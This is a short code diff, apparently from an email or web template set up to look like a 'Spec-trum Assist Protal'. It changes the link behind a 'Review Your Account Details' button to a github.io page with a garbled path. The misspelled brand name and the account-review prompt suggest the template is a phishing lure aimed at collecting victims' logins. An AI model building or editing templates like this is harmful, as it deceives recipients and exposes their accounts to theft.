@@ -27,7 +27,7 @@ Spec-trum Assist Protal`,
     button: {
       enabled: true,
       text: "Review Your Account Details",
-      url: "https://rentassistportal.org",
+      url: "https://julidabaseball.github.io/qailardcowkk/irndex.html",
       color: "#2563EB",
     },
 
